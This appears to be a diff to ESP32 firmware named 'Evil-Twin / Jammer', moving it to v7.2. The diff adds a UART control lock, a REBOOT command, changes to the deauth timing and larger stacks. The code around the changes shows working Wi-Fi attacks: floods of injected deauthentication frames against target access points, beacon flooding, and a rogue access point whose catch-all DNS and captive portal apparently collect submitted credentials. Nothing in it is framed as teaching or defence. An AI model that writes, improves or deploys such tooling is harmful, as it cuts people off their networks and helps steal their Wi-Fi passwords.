@@ -1,5 +1,5 @@
 /* =========================================================
-   ESP32 Evil-Twin / Jammer  v7.1 — Fixed Rom Delay Header
+   ESP32 Evil-Twin / Jammer  v7.2 — UART control (ESP-01)
    ========================================================= */
 #include <WiFi.h>
 #include <WebServer.h>
@@ -29,16 +29,22 @@ volatile uint32_t txOk = 0, txFail = 0, fakeSent = 0;
 uint8_t apCh = 1, apMac[6]; uint16_t seqNo = 0;
 
 WebServer web(80); DNSServer dns;
+portMUX_TYPE qmux = portMUX_INITIALIZER_UNLOCKED;
 
 char qbuf[QN][100]; volatile uint8_t qh = 0, qt = 0;
-void flushQ() {
+
+void flushQLocked() {
   while (qt != qh) { CTL.write((const uint8_t*)qbuf[qt], strlen(qbuf[qt])); CTL.write('\n'); qt = (qt + 1) % QN; }
 }
+void flushQ() { portENTER_CRITICAL(&qmux); flushQLocked(); portEXIT_CRITICAL(&qmux); }
 void ev(const String &s) {
+  portENTER_CRITICAL(&qmux);
   uint8_t n = (qh + 1) % QN;
   if (n == qt) qt = (qt + 1) % QN;
   strncpy(qbuf[qh], s.c_str(), 99); qbuf[qh][99] = 0;
-  qh = n; flushQ();
+  qh = n;
+  flushQLocked();
+  portEXIT_CRITICAL(&qmux);
 }
 
 void apSetSSID(const char *ssid) {
@@ -176,6 +182,7 @@ void attackTask(void *) {
       mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 7); inj(f, 26);
       mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 2); inj(f, 26);
       mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 1); inj(f, 26);
+      delayMicroseconds(120);
       vTaskDelay(2 / portTICK_PERIOD_MS);
     }
     if (bfloodOn && millis() - lastFlood > 300) {
@@ -266,13 +273,14 @@ void handleRoot() {
 }
 
 void hardStop() {
-  attacking = false;
+  attacking = false; rotOn = false;
   esp_wifi_set_promiscuous_rx_cb(NULL);
   esp_wifi_set_promiscuous(false);
   apCh = 1;
   esp_wifi_set_channel(apCh, WIFI_SECOND_CHAN_NONE);
   WiFi.softAP("ESP32-TWIN", NULL, apCh, 1, AP_MAXCONN);
   esp_wifi_deauth_sta(0);
+  ev("EV OFF");
 }
 
 void handleSubmit() {
@@ -335,6 +343,7 @@ void handleCmd(String line) {
   if (line == "BF1") { bfloodOn = true;  ev("EV BF on"); return; }
   if (line.startsWith("DUP ")) { dupCount = constrain(line.substring(4).toInt(), 0, 40); ev("EV DUP " + String(dupCount)); return; }
   if (line == "STOP") { hardStop(); hold = false; ev("EV STOPPED"); return; }
+  if (line == "REBOOT") { ev("EV REBOOT"); vTaskDelay(200); ESP.restart(); return; }
 
   if (line.startsWith("START ")) {
     String rest = line.substring(6); tcount = 0; int p = 0;
@@ -386,8 +395,8 @@ void setup() {
   dns.start(53, "*", WiFi.softAPIP());
   web.on("/", handleRoot); web.on("/submit", HTTP_POST, handleSubmit); web.onNotFound(handleRoot);
   web.begin();
-  xTaskCreatePinnedToCore(attackTask, "atk", 4096, NULL, 4, NULL, 1);
-  xTaskCreatePinnedToCore(statusTask, "st",  4096, NULL, 2, NULL, 1);
+  xTaskCreatePinnedToCore(attackTask, "atk", 6144, NULL, 4, NULL, 1);
+  xTaskCreatePinnedToCore(statusTask, "st",  6144, NULL, 2, NULL, 1);
   xTaskCreatePinnedToCore(rotateTask, "rot", 4096, NULL, 2, NULL, 1);
 }
 
